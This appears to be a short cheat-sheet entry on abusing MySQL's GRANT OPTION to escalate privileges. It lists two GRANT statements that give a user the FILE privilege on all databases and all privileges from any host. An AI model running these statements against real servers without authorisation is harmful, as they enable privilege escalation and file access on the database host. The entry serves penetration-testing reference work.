## exploit GRANT OPTION to grant file write permissions to self
must have `GRANT OPTION` permission
```SQL
GRANT FILE ON *.* TO 'uname'@'localhost' with grant option;
grant all privileges on dbname.* to 'yourusername'@'%' with grant option;
```

